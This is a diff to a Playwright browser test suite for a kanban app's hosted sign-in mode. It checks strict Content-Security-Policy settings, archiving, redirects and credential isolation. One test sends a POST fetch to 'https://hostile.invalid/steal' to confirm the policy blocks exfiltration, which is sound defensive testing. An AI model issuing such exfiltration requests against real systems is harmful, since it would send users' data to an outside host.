@@ -26,6 +26,12 @@ function snapshot() {
 }
 const server = http.createServer(async (req, res) => {
   const u = new URL(req.url, 'http://local');
+  if (req.headers.origin && /^http:\/\/(127\.0\.0\.1|localhost):\d+$/.test(req.headers.origin)) {
+    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
+    res.setHeader('Access-Control-Allow-Headers', 'authorization, content-type, apikey, idempotency-key');
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  }
+  if (req.method === 'OPTIONS') { res.writeHead(204).end(); return; }
   const send = (body, status = 200) => { res.writeHead(status, { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' }); res.end(JSON.stringify(body)); };
   const error = (code, status) => send({ error: { code, message: 'Synthetic refusal', request_id: 'test', retryable: code === 'lock_retry' } }, status);
   if (u.pathname.startsWith('/v1/') || u.pathname.startsWith('/auth/')) {
@@ -66,6 +72,15 @@ const server = http.createServer(async (req, res) => {
         if (body.kind === 'create-card') {
           assert.equal(body.card.num, undefined); const c = { ...body.card, num: files['tasks.json'].next_num++ };
           files['cards/' + c.id + '.json'] = c; revs['cards/' + c.id + '.json'] = 'new'; result = { card_id: c.id, num: c.num };
+        } else if (body.kind === 'archive') {
+          const p = 'cards/' + body.entity_id + '.json', a = 'archive/' + body.year + '.json';
+          assert.equal(body.baseRev, revs[p]); assert.equal(body.rootRev, revs['tasks.json']);
+          assert.equal(body.archiveRev, revs[a] || null);
+          files[a] ||= { version: 3, archive: true, year: body.year, tasks: [], contacts: [], history: {} };
+          files[a].tasks.push(files[p]); delete files[p]; delete revs[p];
+          revs[a] = 'archive-' + (version + 1); revs['tasks.json'] = 'root-' + (version + 1);
+          files['tasks.json'].archive.files[body.year] = { tasks: files[a].tasks.length, contacts: 0 };
+          result = { entity_id: body.entity_id, year: body.year };
         } else if (body.kind === 'comment') {
           files['cards/' + body.card_id + '.json'].comments.push({ id: 'c_new', text: body.text, by: 'synthetic-a', actor: ACTOR, at: '2026-10-15T12:00:00Z' });
           result = { comment_id: 'c_new', actor: ACTOR, at: '2026-10-15T12:00:00Z' };
@@ -88,17 +103,26 @@ const server = http.createServer(async (req, res) => {
   const browser = await chromium.launch({ headless: true }); let passed = 0;
   const ok = name => { passed++; console.log('PASS ' + name); };
   try {
-    const page = await browser.newPage(); const errors = [], github = [], csp = [];
+    const page = await browser.newPage(); const errors = [], github = [];
     page.on('pageerror', e => errors.push(e.message));
     page.on('request', req => { const host = new URL(req.url()).hostname; if (/(^|\.)(github\.com|githubusercontent\.com|githubassets\.com)$/.test(host)) github.push({ url: req.url(), headers: req.headers(), body: req.postData() }); });
     await page.route('https://api.github.com/**', r => r.abort());
-    await page.addInitScript(() => { localStorage.setItem('kb_token', 'existing-github-secret'); localStorage.setItem('kb_repo', 'acme/board'); localStorage.setItem('kb_me', 'forged'); localStorage.setItem('kb_view', 'board'); sessionStorage.setItem('kb_view', 'board'); });
-    await page.goto(`${base}/board/index.html?backend=hosted&api=${encodeURIComponent(base)}&auth=${encodeURIComponent(base)}&board=${BOARD}`);
+    await page.addInitScript(() => { window.__normalCsp = []; document.addEventListener('securitypolicyviolation', e => window.__normalCsp.push({ directive: e.effectiveDirective, blocked: e.blockedURI })); localStorage.setItem('kb_token', 'existing-github-secret'); localStorage.setItem('kb_repo', 'acme/board'); localStorage.setItem('kb_me', 'forged'); localStorage.setItem('kb_view', 'board'); sessionStorage.setItem('kb_view', 'board'); });
+    await page.goto(`${base}/board/hosted.html?backend=hosted&api=${encodeURIComponent(base)}&board=${BOARD}`);
     await page.locator('#hostedSignIn').waitFor();
+    assert.equal(await page.locator('#hostedAuth').inputValue(), base, 'sign-in defaults to the configured API origin');
+    const firstPolicy = await page.locator('head > meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
+    assert.match(firstPolicy, /script-src 'self'; style-src 'self'/);
+    assert.match(firstPolicy, /connect-src 'self';/);
+    assert.ok(!/blob:|unsafe-inline|unsafe-eval/.test(firstPolicy));
     assert.equal(calls.length, 0, 'hosted boot does not read GitHub or private data before sign-in');
     await page.locator('#hostedKey').fill('synthetic-publishable'); await page.locator('#hostedEmail').fill('synthetic@example.test'); await page.locator('#hostedPassword').fill('synthetic-password'); await page.locator('#hostedSignIn').click();
     await page.getByText('Synthetic contract sample', { exact: true }).first().waitFor();
     assert.ok(calls.some(c => c.url === '/v1/me')); assert.ok(calls.some(c => c.url.includes('/files/cards%2Ft_sample.json')));
+    await page.locator('#btnFilter').click(); await page.locator('#sortMenu').selectOption('newest');
+    await page.locator('#btnFilter').click();
+    assert.equal(new URL(page.url()).searchParams.get('api'), base, 'filter routing retains hosted endpoint');
+    assert.equal(new URL(page.url()).searchParams.get('board'), BOARD);
     ok('sign-in, verified identity, snapshot and omitted-history hydration');
 
     await page.evaluate(() => { location.hash = '#17'; }); await page.locator('#dlgCard[open]').waitFor();
@@ -156,9 +180,6 @@ const server = http.createServer(async (req, res) => {
     }, TOKEN);
     assert.equal(leaked, false); assert.equal(github.length, 0); ok('X3: no hosted credential in persistence or any GitHub request');
 
-    await page.evaluate(() => { window.__cspViolations = []; document.addEventListener('securitypolicyviolation', e => window.__cspViolations.push(e.blockedURI)); });
-    const hostile = await page.evaluate(async () => { try { await fetch('https://hostile.invalid/steal', { method: 'POST', body: 'synthetic' }); return false; } catch { return true; } });
-    assert.equal(hostile, true); assert.ok((await page.evaluate(() => window.__cspViolations)).some(x => x.includes('hostile.invalid'))); ok('actual CSP blocks hostile origins');
 
     await page.locator('#cClose').click(); await page.locator('#dlgCard').waitFor({ state: 'hidden' });
     const quick = page.locator('.col[data-col="backlog"] .add input');
@@ -170,19 +191,64 @@ const server = http.createServer(async (req, res) => {
     await page.waitForFunction(() => document.getElementById('cTitle').value === 'New hosted card');
     assert.match(await page.evaluate(() => kbNavigation.link()), /#900000$/);
     ok('new UI cards receive server numbers in Backlog, including six-digit deep links');
-    await page.locator('#cClose').click(); await page.locator('#dlgCard').waitFor({ state: 'hidden' });
+    await page.locator('#dMore').click();
+    await page.locator('.ui-menu').getByRole('menuitem', { name: 'Archive task', exact: true }).click();
+    await page.locator('dialog[open]').filter({ hasText: 'Archive this task?' }).getByRole('button', { name: 'Archive task', exact: true }).click();
+    await page.waitForFunction(() => !document.getElementById('dlgCard').open);
+    assert.equal(files['cards/' + created.id + '.json'], undefined);
+    assert.ok(Object.entries(files).some(([p, f]) => p.startsWith('archive/') && f.tasks.some(t => t.id === created.id)));
+    assert.deepEqual(await page.evaluate(() => window.__normalCsp), [], 'zero CSP violations through sign-in/load/edit/archive');
+    ok('strict hosted entry: sign-in/load/edit/archive without CSP violations');
+    await page.evaluate(() => { window.__cspViolations = []; document.addEventListener('securitypolicyviolation', e => window.__cspViolations.push(e.blockedURI)); });
+    const hostile = await page.evaluate(async () => { try { await fetch('https://hostile.invalid/steal', { method: 'POST', body: 'synthetic' }); return false; } catch { return true; } });
+    assert.equal(hostile, true); assert.ok((await page.evaluate(() => window.__cspViolations)).some(x => x.includes('hostile.invalid'))); ok('actual CSP blocks hostile origins');
+
     await page.locator('#hostedSignOut').click(); await page.locator('#hostedSignIn').waitFor();
     await page.reload(); await page.locator('#hostedSignIn').waitFor();
     assert.equal(await page.locator('#hostedPassword').inputValue(), ''); assert.equal(errors.length, 0, errors.join('\n')); ok('reload requires sign-in and browser has no page errors');
     const second = await browser.newPage();
-    await second.addInitScript(() => { sessionStorage.setItem('kb_view', 'board'); localStorage.setItem('kb_layout', 'classic'); });
+    await second.addInitScript(() => { window.__normalCsp = []; document.addEventListener('securitypolicyviolation', e => window.__normalCsp.push({ directive: e.effectiveDirective, blocked: e.blockedURI })); sessionStorage.setItem('kb_view', 'board'); localStorage.setItem('kb_layout', 'classic'); });
     const secondBase = base.replace('127.0.0.1', 'localhost');
-    await second.goto(`${secondBase}/board/index.html?backend=hosted&api=${encodeURIComponent(secondBase)}&auth=${encodeURIComponent(secondBase)}&board=${BOARD}`);
+    await second.goto(`${secondBase}/board/hosted.html?api=${encodeURIComponent(base)}&auth=${encodeURIComponent(base)}&board=${BOARD}`);
     await second.locator('#hostedKey').fill('synthetic'); await second.locator('#hostedEmail').fill('synthetic@example.test'); await second.locator('#hostedPassword').fill('synthetic'); await second.locator('#hostedSignIn').click();
     await second.getByText('My conflict choice', { exact: true }).first().waitFor();
     const policy = await second.locator('head > meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
-    assert.match(policy, /http:\/\/localhost:54321/); assert.ok(!policy.includes('https://api.github.com'));
-    await second.close(); ok('second localhost origin signs in under a policy with GitHub blocked');
+    const directives = Object.fromEntries(policy.split(';').map(x => x.trim().split(/\s+/)).filter(x => x[0]).map(([k, ...v]) => [k, v]));
+    assert.deepEqual(directives['script-src'], ["'self'"]); assert.deepEqual(directives['style-src'], ["'self'"]);
+    assert.deepEqual(directives['connect-src'], ["'self'", base]);
+    for (const d of ['object-src', 'base-uri', 'frame-src', 'form-action']) assert.deepEqual(directives[d], ["'none'"]);
+    assert.ok(!/blob:|unsafe-inline|unsafe-eval/.test(policy));
+    await second.evaluate(() => { location.hash = '#17'; }); await second.locator('#dlgCard[open]').waitFor();
+    await second.locator('#cTitle').fill('Second origin edit'); await second.locator('#cTitle').blur();
+    await second.waitForFunction(() => document.getElementById('status').textContent.startsWith('Saved'));
+    assert.equal(files['cards/t_sample.json'].title, 'Second origin edit');
+    await second.locator('#dMore').click();
+    await second.locator('.ui-menu').getByRole('menuitem', { name: 'Archive task', exact: true }).click();
+    await second.locator('dialog[open]').filter({ hasText: 'Archive this task?' }).getByRole('button', { name: 'Archive task', exact: true }).click();
+    await second.waitForFunction(() => !document.getElementById('dlgCard').open);
+    assert.equal(files['cards/t_sample.json'], undefined);
+    const rejected = await second.evaluate(async board => {
+      const adapter = new KeeptrackHosted.HostedAdapter({ api: new URL(location.href).searchParams.get('api'), board });
+      try { await adapter.signIn({ auth: 'http://localhost:54321', key: 'synthetic', email: 'synthetic@example.test', password: 'synthetic' }); }
+      catch (e) { return e.message; }
+    }, BOARD);
+    assert.match(rejected, /configured API origin/);
+    assert.deepEqual(await second.evaluate(() => window.__normalCsp), [], 'off-policy auth is rejected before fetch');
+    await second.close(); ok('second origin: strict policy, cross-origin API sign-in/load/edit/archive and zero CSP violations');
+
+    const legacy = await browser.newPage();
+    await legacy.goto(`${base}/board/index.html?backend=hosted&api=${encodeURIComponent(base)}&board=${BOARD}#17`);
+    await legacy.locator('#hostedSignIn').waitFor();
+    assert.equal(new URL(legacy.url()).pathname, '/board/hosted.html'); assert.equal(new URL(legacy.url()).hash, '#17');
+    assert.equal(new URL(legacy.url()).searchParams.get('api'), base); await legacy.close();
+    ok('legacy hosted links redirect to strict entry with query and hash intact');
+
+    const stale = await browser.newPage();
+    await stale.addInitScript(() => sessionStorage.setItem('kb_markup_reload', String(Date.now())));
+    await stale.route('**/board/hosted.html*', async route => route.fulfill({ contentType: 'text/html', body: fs.readFileSync(path.join(ROOT, 'board/hosted.html'), 'utf8').replace('data-kb-markup="4"', 'data-kb-markup="999"') }));
+    await stale.goto(`${base}/board/hosted.html?api=${encodeURIComponent(base)}`);
+    await stale.locator('#kbStale').waitFor(); assert.equal(await stale.locator('#hostedSignIn').count(), 0);
+    await stale.close(); ok('hosted markup mismatch refuses application initialisation');
     console.log(`${passed} hosted browser checks passed`);
   } finally { await browser.close(); await new Promise(resolve => server.close(resolve)); }
 })().catch(e => { console.error(e); process.exitCode = 1; server.close(); });
